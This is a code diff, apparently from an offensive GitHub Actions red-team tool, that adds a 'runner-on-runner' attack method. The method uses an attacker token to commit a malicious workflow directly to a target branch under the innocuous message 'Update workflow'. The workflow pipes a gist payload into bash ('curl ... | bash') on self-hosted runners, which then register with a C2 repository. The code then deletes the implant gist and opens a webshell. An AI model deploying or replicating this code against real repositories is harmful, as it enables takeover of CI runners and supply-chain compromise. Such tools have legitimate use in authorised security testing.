@@ -287,6 +287,98 @@ class WebShell(Attacker):
         else:
             Output.warn("No runners connected to C2 repository!")
             return False
+        
+    def push_runner_on_runner(
+        self,
+        target_repo: str, 
+        target_branch: str,
+        payload_name: str = "tests",
+        workflow_name: str = "Testing",
+        run_name: str = "Testing",
+        c2_repo: str = None,
+        target_os: str = "linux",
+        target_arch: str = "x64",
+        keep_alive: bool = False,
+        requested_labels: list = None
+    ):
+        """Performs a direct push runner-on-runner attack.
+        
+        Instead of using a pull request, directly pushes the malicious workflow
+        to the target branch.
+        """
+        self.setup_user_info()
+
+        if not self.user_perms:
+            return False
+            
+        # Check required permissions
+        if not (
+            "repo" in self.user_perms["scopes"] 
+            and "workflow" in self.user_perms["scopes"]
+            and "gist" in self.user_perms["scopes"]
+        ):
+            Output.error("Insufficient scopes for attacker PAT!")
+            return False
+
+        # Setup C2 repo if not provided
+        if not c2_repo:
+            c2_repo = self.configure_c2_repository()
+            Output.info(f"Created C2 repository: {Output.bright(c2_repo)}")
+        else:
+            Output.info(f"Using provided C2 repository: {Output.bright(c2_repo)}")
+
+        # Create runner payload gist
+        gist_id, gist_url = self.setup_payload_gist_and_workflow(
+            c2_repo, target_os, target_arch, keep_alive=keep_alive
+        )
+
+        # Create malicious workflow that runs on push
+        ror_workflow = f"""name: {workflow_name}
+    on:
+    push:
+        branches: ['{target_branch}']
+    jobs:
+    {run_name}:
+        runs-on: [self-hosted]
+        steps:
+        - name: Runner Setup
+            run: |
+            curl -s {gist_url}/raw | bash
+    """
+
+        # Commit workflow directly to target branch
+        status = self.api.commit_workflow(
+            target_repo,
+            target_branch, 
+            ror_workflow.encode(),
+            f"{payload_name}.yml",
+            commit_author=self.author_name,
+            commit_email=self.author_email,
+            message="Update workflow"
+        )
+
+        if not status:
+            Output.error("Failed to commit RoR workflow to target repository!")
+            return False
+
+        Output.info("Waiting for runner to connect...")
+
+        # Monitor for runner connection
+        for i in range(self.timeout):
+            runners = self.api.get_repo_runners(c2_repo)
+            if runners:
+                Output.owned("Runner connected to C2 repository!")
+                Output.info("Deleting implantation Gist.")
+                self.api.call_delete(f"/gists/{gist_id}")
+                self.interact_webshell(c2_repo, runner_name=runners[0]["name"])
+                break
+            else:
+                time.sleep(1)
+        else:
+            Output.warn("No runners connected to C2 repository!")
+            return False
+
+        return True
 
     def interact_webshell(self, c2_repo: str, runner_name: str = None):
         """Interacts with the webshell to issue commands."""
